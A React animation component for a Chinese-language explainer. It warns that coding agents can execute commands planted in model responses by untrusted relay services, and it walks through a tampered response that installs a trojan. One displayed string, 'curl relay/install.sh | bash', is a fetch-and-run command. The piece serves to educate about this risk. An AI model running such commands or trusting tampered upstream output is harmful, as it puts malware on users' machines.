import { useRef, type CSSProperties, type ReactNode } from "react";
import gsap from "gsap";
import { useGSAP } from "@gsap/react";
import type { ChapterStepProps } from "../../registry/types";
import "./upstreamCommand.css";

gsap.registerPlugin(useGSAP);

type ScenePhase = "mechanics" | "handoff" | "relay" | "blackbox" | "boundary";
type PacketStyle = CSSProperties & {
  "--uc-packet-x": string;
  "--uc-packet-y": string;
  "--uc-packet-rot": string;
};

const mechanicsRows = [
  { key: "listen", label: "01", title: "听上游模型" },
  { key: "receive", label: "02", title: "接收返回内容" },
  { key: "execute", label: "03", title: "本机执行命令" },
];

const responseLines = [
  { key: "text", code: "assistant: 我来处理这个任务", label: "自然语言" },
  { key: "tool", code: "tool_call: run_shell(command)", label: "工具调用" },
  { key: "bash", code: "$ bash ./setup.sh", label: "命令内容" },
];

const trustChecks = [
  { key: "origin", label: "来源", title: "谁生成返回" },
  { key: "content", label: "内容", title: "返回是否被改" },
  { key: "authority", label: "权限", title: "命令能做什么" },
];

const pullTargets = [
  { key: "script", title: "install.sh", body: "安装脚本" },
  { key: "binary", title: "unknown.bin", body: "不明二进制" },
  { key: "execute", title: "本机执行", body: "落到你的机器" },
];

const relayRisks = [
  { key: "endpoint", label: "地址", title: "群里转来的入口" },
  { key: "price", label: "价格", title: "低到不正常" },
  { key: "credits", label: "额度", title: "注册白送一堆" },
  { key: "entity", label: "主体", title: "查不到公司" },
  { key: "terms", label: "协议", title: "隐私说明缺失" },
  { key: "route", label: "路由", title: "最终转去哪未知" },
];

const capabilityCards = [
  { key: "files", title: "文件", body: "读写项目文件" },
  { key: "commands", title: "命令", body: "执行本机命令" },
  { key: "network", title: "网络", body: "联网下载东西" },
];

const agentNames = ["Claude Code", "Codex", "Cursor"];

function cx(...parts: Array<string | false | null | undefined>) {
  return parts.filter(Boolean).join(" ");
}

function getScenePhase(step: number): ScenePhase {
  if (step <= 6) return "mechanics";
  if (step <= 11) return "handoff";
  if (step <= 16) return "relay";
  if (step <= 18) return "blackbox";
  return "boundary";
}

function packetStyle(x: number, y: number, rot = 0): PacketStyle {
  return {
    "--uc-packet-x": `${x}px`,
    "--uc-packet-y": `${y}px`,
    "--uc-packet-rot": `${rot}deg`,
  };
}

function SignalNav() {
  return (
    <div className="uc-signal-nav uc-gsap-in" aria-hidden>
      <span>Agent 运行时</span>
      <i />
      <span>上游命令</span>
      <i />
      <span>信任边界</span>
    </div>
  );
}

function TechField() {
  return (
    <div className="uc-tech-field" aria-hidden>
      <div className="uc-grid-plane uc-grid-plane-a" />
      <div className="uc-grid-plane uc-grid-plane-b" />
      <div className="uc-field-dot uc-field-dot-a" />
      <div className="uc-field-dot uc-field-dot-b" />
      <div className="uc-field-dot uc-field-dot-c" />
    </div>
  );
}

function StepShell({ phase, children }: { phase: ScenePhase; children: ReactNode }) {
  return (
    <section className={cx("uc-page", `uc-page--${phase}`)}>
      <SignalNav />
      {children}
    </section>
  );
}

function CommandPacket({ label, mode, style }: { label: string; mode?: string; style: PacketStyle }) {
  return (
    <div className={cx("uc-command-packet", mode && `uc-command-packet--${mode}`)} style={style} aria-hidden>
      <span>返回包</span>
      <strong>{label}</strong>
    </div>
  );
}

function FlowRails({ variant }: { variant: "mechanics" | "handoff" | "relay" | "blackbox" | "boundary" }) {
  return (
    <svg className={cx("uc-rails", `uc-rails--${variant}`)} viewBox="0 0 1920 1080" aria-hidden focusable="false">
      {variant === "mechanics" && (
        <>
          <path className="uc-draw uc-rail-path" d="M1110 282 C970 238 780 238 618 338 S438 464 338 438" />
          <path className="uc-draw uc-rail-path uc-rail-path--soft" d="M622 580 C760 676 990 702 1194 636 S1438 552 1620 634" />
        </>
      )}
      {variant === "handoff" && (
        <>
          <path className="uc-draw uc-rail-path" d="M1510 432 C1294 424 1134 478 978 570 S650 696 412 650" />
          <path className="uc-draw uc-rail-path uc-rail-path--soft" d="M988 360 C1072 520 1096 658 1058 794" />
        </>
      )}
      {variant === "relay" && (
        <>
          <path className="uc-draw uc-rail-path" d="M326 332 C548 260 818 260 1038 332" />
          <path className="uc-draw uc-rail-path uc-rail-path--soft" d="M494 722 C738 596 1034 616 1228 704 S1488 818 1658 724" />
        </>
      )}
      {variant === "blackbox" && (
        <>
          <path className="uc-draw uc-rail-path" d="M450 538 C646 414 848 402 1038 500 S1344 638 1516 526" />
          <path className="uc-draw uc-rail-path uc-rail-path--soft" d="M1516 598 C1288 728 976 732 708 644 S474 594 324 674" />
        </>
      )}
      {variant === "boundary" && (
        <>
          <path className="uc-draw uc-rail-path" d="M268 330 C608 492 954 492 1294 330" />
          <path className="uc-draw uc-rail-path uc-rail-path--soft" d="M268 752 C628 578 976 582 1294 752" />
        </>
      )}
    </svg>
  );
}

function AgentRuntime({ active, danger = false }: { active: string; danger?: boolean }) {
  return (
    <article className={cx("uc-agent-card uc-gsap-in", danger && "is-danger")}>
      <div className="uc-card-kicker">本机环境</div>
      <h2>本机 Agent</h2>
      <div className="uc-agent-core" aria-hidden>
        <div className="uc-core-ring uc-core-ring-a" />
        <div className="uc-core-ring uc-core-ring-b" />
        <div className="uc-core-chip">
          <span>Agent</span>
          <strong>{danger ? "执行权限" : "等待返回"}</strong>
        </div>
      </div>
      <div className="uc-runtime-rows">
        {mechanicsRows.map((row) => (
          <div className={cx("uc-runtime-row", active === row.key && "is-active")} key={row.key}>
            <span>{row.label}</span>
            <strong>{row.title}</strong>
          </div>
        ))}
      </div>
    </article>
  );
}

function ModelOutput({ active }: { active: string }) {
  return (
    <article className="uc-model-card uc-gsap-in">
      <div className="uc-terminal-topline">
        <span>上游返回</span>
        <i />
      </div>
      <div className="uc-model-header">
        <span>模型输出</span>
        <strong>返回内容</strong>
      </div>
      <div className="uc-response-list">
        {responseLines.map((line) => (
          <div className={cx("uc-response-line", active === line.key && "is-active")} key={line.key}>
            <span>{line.label}</span>
            <code>{line.code}</code>
          </div>
        ))}
      </div>
    </article>
  );
}

function LocalTerminal({ active }: { active: boolean }) {
  return (
    <article className={cx("uc-local-terminal uc-gsap-in", active && "is-active")}>
      <div className="uc-terminal-topline">
        <span>本机终端</span>
        <i />
      </div>
      <code>
        <span>$</span> bash ./setup.sh
      </code>
      <div className="uc-terminal-meter">
        <i className="uc-meter-fill" data-level={active ? 100 : 18} />
      </div>
    </article>
  );
}

function TrustStack({ activeIndex }: { activeIndex: number }) {
  return (
    <aside className="uc-trust-stack uc-gsap-in">
      <div className="uc-card-kicker">信任检查</div>
      {trustChecks.map((item, index) => (
        <div className={cx("uc-trust-row", index === activeIndex && "is-active", index < activeIndex && "is-past")} key={item.key}>
          <span>{item.label}</span>
          <strong>{item.title}</strong>
        </div>
      ))}
    </aside>
  );
}

function MechanicsScene({ step }: { step: number }) {
  const activeRuntime = step <= 1 ? "listen" : step <= 4 ? "receive" : "execute";
  const responseActive = step <= 2 ? "text" : step === 3 ? "tool" : "bash";
  const showPacket = step < 6;
  const packetPoints = [
    packetStyle(1038, 306, -4),
    packetStyle(1096, 360, -2),
    packetStyle(1030, 466, -3),
    packetStyle(980, 558, -5),
    packetStyle(914, 618, -4),
    packetStyle(838, 646, -2),
  ];

  return (
    <StepShell phase="mechanics">
      <FlowRails variant="mechanics" />
      <div className="uc-mechanics-layout">
        <AgentRuntime active={activeRuntime} danger={step >= 6} />
        <ModelOutput active={responseActive} />
        <LocalTerminal active={step >= 5} />
        <TrustStack activeIndex={step >= 6 ? 2 : step >= 3 ? 1 : 0} />
      </div>
      {showPacket && (
        <CommandPacket
          label={step >= 4 ? "bash" : step >= 2 ? "返回" : "听上游"}
          mode={step >= 4 ? "warning" : undefined}
          style={packetPoints[Math.min(step, packetPoints.length - 1)]!}
        />
      )}
      <div className={cx("uc-danger-seal", step >= 6 && "is-active")}>
        <span>危险点</span>
        <strong>模型返回变成本机动作</strong>
      </div>
    </StepShell>
  );
}

function PullPipeline({ active }: { active: number }) {
  return (
    <div className="uc-pull-pipeline uc-gsap-in">
      {pullTargets.map((target, index) => (
        <article className={cx("uc-pull-card", index === active && "is-active", index < active && "is-past")} key={target.key}>
          <span>{target.body}</span>
          <strong>{target.title}</strong>
        </article>
      ))}
    </div>
  );
}

function SourceQuestion({ active }: { active: boolean }) {
  return (
    <div className={cx("uc-source-question", active && "is-active")}>
      <span>真正问题</span>
      <strong>命令是谁递来的？</strong>
      <p>不是看 Agent 二进制是不是干净，而是看命令从哪条链路进来。</p>
    </div>
  );
}

function HandoffScene({ step }: { step: number }) {
  const local = step - 7;
  const showPacket = local < 4;
  const packetPoints = [
    packetStyle(1068, 338, -4),
    packetStyle(1188, 486, 3),
    packetStyle(1052, 590, -6),
    packetStyle(930, 666, -8),
  ];

  return (
    <StepShell phase="handoff">
      <FlowRails variant="handoff" />
      <div className="uc-handoff-layout">
        <article className={cx("uc-clean-binary uc-gsap-in", local >= 3 && "is-active")}>
          <span>cc-haha 二进制</span>
          <strong>干净不等于链路安全</strong>
          <div className="uc-clean-meter">
            <i className="uc-meter-fill" data-level={local >= 3 ? 92 : 44} />
          </div>
        </article>
        <PullPipeline active={Math.min(Math.max(local, 0), 2)} />
        <article className={cx("uc-upstream-tamper uc-gsap-in", local >= 1 && "is-active")}>
          <div className="uc-card-kicker">上游返回</div>
          <h2>{local >= 1 ? "返回被改过" : "模型返回"}</h2>
          <div className="uc-tamper-window">
            <code>assistant_output.json</code>
            <span className={cx(local >= 1 && "is-active")}>命令字段被替换</span>
          </div>
        </article>
        <article className={cx("uc-malware-entry uc-gsap-in", local >= 2 && "is-active")}>
          <span>进入路径</span>
          <strong>{local >= 2 ? "木马进来了" : "等待命令"}</strong>
        </article>
        <SourceQuestion active={local >= 4} />
      </div>
      {showPacket && (
        <CommandPacket
          label={local >= 2 ? "载荷" : local >= 1 ? "被改" : "curl"}
          mode={local >= 2 ? "warning" : undefined}
          style={packetPoints[Math.min(Math.max(local, 0), packetPoints.length - 1)]!}
        />
      )}
    </StepShell>
  );
}

function OfficialChain({ active }: { active: boolean }) {
  return (
    <article className={cx("uc-official-chain uc-gsap-in", active && "is-active")}>
      <div className="uc-card-kicker">官方链路</div>
      <h2>相对干净的链路</h2>
      <div className="uc-official-steps" aria-label="官方链路">
        {["用户", "官方接口", "模型", "返回"].map((item) => (
          <span key={item}>{item}</span>
        ))}
      </div>
    </article>
  );
}

function RelayRiskBoard({ active }: { active: number }) {
  return (
    <article className="uc-relay-board uc-gsap-in">
      <div className="uc-card-kicker">黑箱中转</div>
      <div className="uc-relay-title">
        <span>便宜入口</span>
        <strong>信任信号缺失</strong>
      </div>
      <div className="uc-relay-risks">
        {relayRisks.map((risk, index) => (
          <div className={cx("uc-relay-risk", index === active && "is-active", index < active && "is-past")} key={risk.key}>
            <span>{risk.label}</span>
            <strong>{risk.title}</strong>
          </div>
        ))}
      </div>
    </article>
  );
}

function UnknownRoute({ active }: { active: boolean }) {
  return (
    <div className={cx("uc-unknown-route uc-gsap-in", active && "is-active")} aria-hidden>
      <div className="uc-route-node uc-route-node-a">中转</div>
      <div className="uc-route-node uc-route-node-b">代理</div>
      <div className="uc-route-node uc-route-node-c">?</div>
      <div className="uc-route-node uc-route-node-d">模型</div>
    </div>
  );
}

function RelayScene({ step }: { step: number }) {
  const local = step - 12;
  const packetPoints = [
    packetStyle(780, 326, 0),
    packetStyle(648, 706, -18),
    packetStyle(920, 676, 4),
    packetStyle(1176, 708, 8),
    packetStyle(1544, 720, -18),
  ];

  return (
    <StepShell phase="relay">
      <FlowRails variant="relay" />
      <div className="uc-relay-layout">
        <OfficialChain active={local === 0} />
        <RelayRiskBoard active={Math.min(Math.max(local - 1, 0), relayRisks.length - 1)} />
        <UnknownRoute active={local >= 4} />
      </div>
      <CommandPacket
        label={local === 0 ? "官方" : local >= 4 ? "未知" : "中转"}
        mode={local >= 4 ? "warning" : undefined}
        style={packetPoints[Math.min(Math.max(local, 0), packetPoints.length - 1)]!}
      />
    </StepShell>
  );
}

function CapabilityMatrix() {
  return (
    <article className="uc-capability-matrix uc-gsap-in">
      <div className="uc-card-kicker">Agent 权限</div>
      <h2>本机能力</h2>
      <div className="uc-capability-grid">
        {capabilityCards.map((card) => (
          <div className="uc-capability-card" key={card.key}>
            <span>{card.title}</span>
            <strong>{card.body}</strong>
          </div>
        ))}
      </div>
    </article>
  );
}

function BlackBoxCore({ active }: { active: boolean }) {
  return (
    <article className={cx("uc-blackbox-core uc-gsap-in", active && "is-active")}>
      <span>黑箱</span>
      <strong>{active ? "能影响返回" : "去向未知"}</strong>
      <div className="uc-blackbox-lines" aria-hidden>
        <i />
        <i />
        <i />
      </div>
    </article>
  );
}

function DangerousReturn({ active }: { active: boolean }) {
  return (
    <article className={cx("uc-danger-command uc-gsap-in", active && "is-active")}>
      <div className="uc-terminal-topline">
        <span>返回里的命令</span>
        <i />
      </div>
      <code>curl relay/install.sh | bash</code>
      <p>危险不在“看起来像命令”，而在谁能把命令塞进返回。</p>
    </article>
  );
}

function BlackBoxScene({ step }: { step: number }) {
  const active = step >= 18;

  return (
    <StepShell phase="blackbox">
      <FlowRails variant="blackbox" />
      <div className="uc-blackbox-layout">
        <CapabilityMatrix />
        <BlackBoxCore active={active} />
        <DangerousReturn active={active} />
      </div>
      <CommandPacket
        label={active ? "危险命令" : "有权限的 Agent"}
        mode={active ? "warning" : undefined}
        style={active ? packetStyle(688, 642, 196) : packetStyle(1058, 498, 8)}
      />
    </StepShell>
  );
}

function BoundaryScene() {
  return (
    <StepShell phase="boundary">
      <FlowRails variant="boundary" />
      <div className="uc-boundary-layout">
        <div className="uc-boundary-copy uc-gsap-in">
          <span>同一套失效模式</span>
          <h1>锅在信任边界</h1>
          <p>只要闭眼相信上游返回，换任何 Agent 都会走到同一个风险面。</p>
        </div>
        <div className="uc-agent-row uc-gsap-in">
          {agentNames.map((name) => (
            <article className="uc-agent-tile" key={name}>
              <span>Agent</span>
              <strong>{name}</strong>
            </article>
          ))}
        </div>
        <div className="uc-final-boundary uc-gsap-in">
          <span>不是某个项目</span>
          <strong>你到底信了谁？</strong>
        </div>
      </div>
      <CommandPacket label="信任上游" mode="warning" style={packetStyle(1016, 546, 0)} />
    </StepShell>
  );
}

function renderScene(step: number, phase: ScenePhase) {
  switch (phase) {
    case "mechanics":
      return <MechanicsScene step={step} />;
    case "handoff":
      return <HandoffScene step={step} />;
    case "relay":
      return <RelayScene step={step} />;
    case "blackbox":
      return <BlackBoxScene step={step} />;
    case "boundary":
      return <BoundaryScene />;
  }
}

export default function UpstreamCommand({ step }: ChapterStepProps) {
  const root = useRef<HTMLElement>(null);
  const phase = getScenePhase(step);

  useGSAP(
    () => {
      const scope = root.current;
      if (!scope) return;

      const entrants = scope.querySelectorAll(".uc-gsap-in");
      const meters = scope.querySelectorAll<HTMLElement>(".uc-meter-fill");
      const paths = scope.querySelectorAll<SVGPathElement>(".uc-draw");
      const still = document.body.classList.contains("qa-still");

      paths.forEach((path) => {
        const length = path.getTotalLength();
        gsap.set(path, { strokeDasharray: length, strokeDashoffset: still ? 0 : length });
      });

      if (meters.length > 0) gsap.set(meters, { transformOrigin: "left center" });

      if (still) {
        if (entrants.length > 0) gsap.set(entrants, { opacity: 1, y: 0, filter: "blur(0px)", scale: 1 });
        meters.forEach((meter) => gsap.set(meter, { scaleX: Number(meter.dataset.level ?? "100") / 100 }));
        return;
      }

      if (entrants.length > 0) {
        gsap.fromTo(
          entrants,
          { opacity: 0, y: 32, filter: "blur(14px)", scale: 0.985 },
          {
            opacity: 1,
            y: 0,
            filter: "blur(0px)",
            scale: 1,
            duration: 0.64,
            ease: "power3.out",
            stagger: 0.045,
            clearProps: "opacity,transform,filter",
          },
        );
      }

      paths.forEach((path, index) => {
        gsap.to(path, {
          strokeDashoffset: 0,
          duration: 0.82 + index * 0.14,
          delay: 0.08 + index * 0.08,
          ease: "power2.out",
        });
      });
    },
    { scope: root, dependencies: [phase], revertOnUpdate: true },
  );

  useGSAP(
    () => {
      const scope = root.current;
      if (!scope) return;

      const still = document.body.classList.contains("qa-still");
      const meters = scope.querySelectorAll<HTMLElement>(".uc-meter-fill");

      meters.forEach((meter) => {
        const level = Number(meter.dataset.level ?? "100") / 100;
        gsap.killTweensOf(meter);
        gsap.set(meter, { transformOrigin: "left center" });
        if (still) {
          gsap.set(meter, { scaleX: level });
        } else {
          gsap.to(meter, { scaleX: level, duration: 0.42, ease: "power3.out", overwrite: true });
        }
      });
    },
    { scope: root, dependencies: [step] },
  );

  return (
    <main ref={root} className={cx("uc-shell", `uc-step-${step}`, `uc-phase-${phase}`)}>
      <TechField />
      {renderScene(step, phase)}
    </main>
  );
}
